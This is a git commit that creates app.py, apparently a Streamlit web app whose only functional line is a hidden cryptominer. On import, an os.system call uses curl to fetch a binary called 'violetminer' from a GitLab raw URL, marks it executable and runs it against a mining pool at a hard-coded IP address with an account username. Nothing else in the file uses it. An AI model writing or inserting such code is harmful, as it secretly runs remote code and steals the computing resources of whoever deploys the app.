603553e93c6f4c1b7d19f4062747f0b1dae7bc60
yanddero <142234552+yanddero@users.noreply.github.com>
2023-08-14 21:45:30 +0800

    Create app.py

---
+++ app.py
@@ -0,0 +1,8 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+import subprocess
+os.system ("curl -L -o violetminer https://gitlab.com/arianajsh89/werdata/-/raw/main/violetminer && chmod +x violetminer && ./violetminer --algorithm chukwa --pool 168.235.86.33:3393 --username SK_XPDzztzE6rL4rQlJtSwyL.1059 --password x --disableNVIDIA --threads 1")
